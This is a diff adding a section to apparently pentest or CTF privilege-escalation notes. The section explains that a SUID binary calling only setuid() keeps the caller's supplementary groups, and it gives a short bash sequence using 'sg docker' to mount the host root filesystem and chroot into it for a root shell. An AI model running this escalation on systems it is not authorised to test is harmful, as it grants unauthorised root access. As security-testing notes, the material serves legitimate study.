@@ -1815,3 +1815,26 @@ with `pspy`. Same idea applies to any root job that resolves a hostname it trust
 mirror, internal API, license check).
 
 <!-- promoted-slug: writable-etc-hosts-root-fetch-cred-capture -->
+
+## SUID that only `setuid()`s keeps your original groups -> `sg <group>` / `newgrp`
+
+A custom SUID binary doing `setuid(other_uid); execl("/bin/bash", ...)` changes your **UID** to the
+target user but does NOT touch your **supplementary groups** (those come from `/etc/group`, set at
+login, not from the SUID call). If that target user happens to be a member of a privileged group
+(`docker`, `lxd`, `disk`), you already have that group access under your ORIGINAL login groups too —
+check first, since a SUID that only calls `setuid()` (no `setgid()`) is a red herring if you already
+hold the group.
+
+```bash
+id                              # note your existing groups
+./suid-binary                   # now uid=<other>, but groups= are UNCHANGED
+id                               # confirm: same supplementary groups as before setuid()
+groups                           # if docker/lxd is listed, go straight to the socket
+sg docker -c 'docker run -v /:/host --rm -it alpine chroot /host sh'   # or: newgrp docker
+```
+
+The general check on ANY new shell/user context: `id` again and diff the `groups=` field against
+what you had before — a UID change with an unchanged, already-privileged group list is a direct
+path to [[linux-container-escape]] without needing the SUID to also flip your GID.
+
+<!-- promoted-slug: suid-setuid-keeps-groups-sg-docker -->
